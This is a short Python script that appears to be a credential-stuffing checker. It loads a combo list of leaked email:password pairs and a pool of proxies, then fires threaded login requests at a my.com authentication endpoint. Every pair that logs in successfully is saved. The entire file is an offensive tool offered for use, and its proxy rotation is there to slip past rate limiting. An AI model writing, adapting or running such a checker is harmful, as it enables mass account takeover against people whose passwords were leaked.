from lib import request, loader
from random import choice
from concurrent import futures
#from lib.parse import save

loader.load_combo(your combo here)

def check(email, password):
   proxy = choice(loader.proxies)
   block_one = request.get_response('GET', url=f'https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}', proxies=proxy, timeout=5)
   block_one.fail('Ok=0')
   block_one.success(save=True, statement='Ok=1', save_this=(f'{email}:{password}\n'))
   print(f'success : {request.success} fail : {request.fail}\n')

#check('hsbc', 'hehfjd')
#
futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)
